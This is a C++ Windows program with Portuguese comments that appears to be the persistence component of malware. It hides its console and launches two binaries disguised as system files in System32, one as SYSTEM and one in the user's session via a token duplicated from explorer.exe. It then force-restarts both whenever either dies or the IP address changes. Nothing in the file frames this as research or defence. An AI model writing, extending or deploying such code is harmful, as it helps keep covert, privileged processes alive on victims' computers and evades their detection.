#define _WIN32_WINNT 0x0600
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>
#include <stdio.h>
#include <string>
#include <tlhelp32.h>
#include <userenv.h>
#include <shlwapi.h>

#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Ws2_32.lib")

// --- CONFIGURAÇÕES DE CAMINHO ---
const char* PATH_REI = "C:\\Windows\\System32\\Windows.exe";
const char* PATH_SUDITO = "C:\\Windows\\System32\\Windows.assistant.exe";

// Captura o endereço IP da interface ativa válida
std::string GetActiveIP() {
    ULONG outBufLen = 15000;
    PIP_ADAPTER_ADDRESSES pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(outBufLen);
    std::string ip = "0.0.0.0";

    if (GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen) == NO_ERROR) {
        for (PIP_ADAPTER_ADDRESSES pCurrAddresses = pAddresses; pCurrAddresses != NULL; pCurrAddresses = pCurrAddresses->Next) {
            if (pCurrAddresses->OperStatus == IfOperStatusUp && pCurrAddresses->IfType != IF_TYPE_SOFTWARE_LOOPBACK) {
                for (PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pCurrAddresses->FirstUnicastAddress; pUnicast != NULL; pUnicast = pUnicast->Next) {
                    char buf[100];
                    getnameinfo(pUnicast->Address.lpSockaddr, pUnicast->Address.iSockaddrLength, buf, sizeof(buf), NULL, 0, NI_NUMERICHOST);
                    ip = buf;
                    goto cleanup;
                }
            }
        }
    }
cleanup:
    if (pAddresses) free(pAddresses);
    return ip;
}

// Injeta o executável Súdito na sessão do usuário clonando o token do explorer.exe e retornando o HANDLE do processo
HANDLE IniciarSuditoEObterHandle(const char* pPath) {
    HANDLE hToken = NULL;
    HANDLE hProcess = NULL;
    HANDLE hTargetProcess = NULL;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (hProcess && OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
        HANDLE hTokenDup = NULL;
        if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hTokenDup)) {
            STARTUPINFO si = { sizeof(si) };
            PROCESS_INFORMATION pi = { 0 };
            si.cb = sizeof(si);
            si.lpDesktop = (char*)"winsta0\\default"; 

            if (CreateProcessAsUser(hTokenDup, pPath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                hTargetProcess = pi.hProcess; // Retorna o handle para sincronização assíncrona
                CloseHandle(pi.hThread);
            }
            CloseHandle(hTokenDup);
        }
        CloseHandle(hToken);
        CloseHandle(hProcess);
    }
    return hTargetProcess;
}

// Gerencia o encerramento forçado e a recriação limpa dos objetos de sincronização
void ReiniciarHierarquiaComHandles(HANDLE& hReiProcess, HANDLE& hSuditoProcess) {
    if (hReiProcess) { CloseHandle(hReiProcess); hReiProcess = NULL; }
    if (hSuditoProcess) { CloseHandle(hSuditoProcess); hSuditoProcess = NULL; }

    system("taskkill /F /IM Windows.exe > nul 2>&1");
    system("taskkill /F /IM Windows.assistant.exe > nul 2>&1");
    Sleep(1500);

    // 1. Inicializa o Rei (SYSTEM) e captura o handle ativo
    STARTUPINFO siRei = { sizeof(siRei) };
    PROCESS_INFORMATION piRei = { 0 };
    siRei.cb = sizeof(siRei);

    if (CreateProcessA(PATH_REI, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &siRei, &piRei)) {
        hReiProcess = piRei.hProcess; 
        CloseHandle(piRei.hThread);
    }

    // 2. Inicializa o Súdito (USER) e captura o handle ativo
    hSuditoProcess = IniciarSuditoEObterHandle(PATH_SUDITO);
}

int main() {
    // Ocultamento imediato do console Win32
    HWND stealth = GetConsoleWindow();
    ShowWindow(stealth, SW_HIDE);

    // Retenção Pré-Conexão Infinita: Aguarda pacientemente a subida do link de rede
    std::string lastIP = GetActiveIP();
    while (lastIP == "0.0.0.0") {
        Sleep(5000);
        lastIP = GetActiveIP();
    }

    // Inicialização da infraestrutura de handles de monitoramento
    HANDLE hProcessos[2] = { NULL, NULL }; // [0] = Rei, [1] = Súdito
    ReiniciarHierarquiaComHandles(hProcessos[0], hProcessos[1]);

    // Loop de Execução Baseado em Eventos de Kernel (Consumo 0% de CPU)
    while (true) {
        // Bloqueia a execução aqui até que um processo morra OU passem 5000ms (Timeout de verificação de rede)
        DWORD dwEvent = WaitForMultipleObjects(2, hProcessos, FALSE, 5000);

        // Cenário A: Interrupção imediata detectada (O Rei ou o Súdito caíram)
        if (dwEvent == WAIT_OBJECT_0 || dwEvent == (WAIT_OBJECT_0 + 1)) {
            ReiniciarHierarquiaComHandles(hProcessos[0], hProcessos[1]);
        }
        // Cenário B: Timeout de 5 segundos atingido sem quedas. Executa validação de IP em background de forma leve.
        else if (dwEvent == WAIT_TIMEOUT) {
            std::string currentIP = GetActiveIP();
            if (currentIP != lastIP && currentIP != "0.0.0.0") {
                ReiniciarHierarquiaComHandles(hProcessos[0], hProcessos[1]);
                lastIP = currentIP;
            }
        }
    }
    return 0;
}